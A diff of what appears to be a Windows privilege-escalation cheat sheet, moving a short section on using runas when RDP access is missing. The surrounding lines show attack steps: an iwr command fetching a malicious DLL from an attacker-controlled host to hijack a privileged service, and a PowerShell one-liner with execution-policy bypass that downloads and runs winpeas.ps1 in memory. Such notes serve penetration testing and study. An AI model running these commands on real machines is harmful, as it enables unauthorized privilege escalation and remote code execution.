@@ -247,13 +247,6 @@ Otherwise, if the service startup type is automatic, the system can be rebooted:
 ```powershell
 shutdown /r /t 0
 ```
-# No GUI?
-If a compromised user isn't part of "Remote Desktop Users" or "Remote Management Users", this means RDP access can't be gained as that user.
-
-Instead, use runas on an account with GUI access to run a cmd or powershell:
-```powershell
-runas /user:$USER cmd
-```
 # DLL Hijacking
 By hijacking a DLL a high privileged service uses, privesc is possible.
 ## Standard DLL search order
@@ -310,6 +303,13 @@ Download to target machine:
 iwr -uri http://$(ATTACKER_IP)/$NAME_OF_VULNERABLE.dll -OutFile 'C:\Path\to\higher\dll\search\order\$NAME_OF_VULNERABLE.dll'
 ```
 Once the service that uses the vulnerable DLL is started or restarted by someone of higher privileges (if the service startup type is automatic, the system can be rebooted), then the malicious DLL will be run.
+# No GUI?
+If a compromised user isn't part of "Remote Desktop Users" or "Remote Management Users", this means RDP access can't be gained as that user.
+
+Instead, use runas on an account with GUI access to run a cmd or powershell:
+```powershell
+runas /user:$USER cmd
+```
 # Winpeas
 ```powershell
 powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
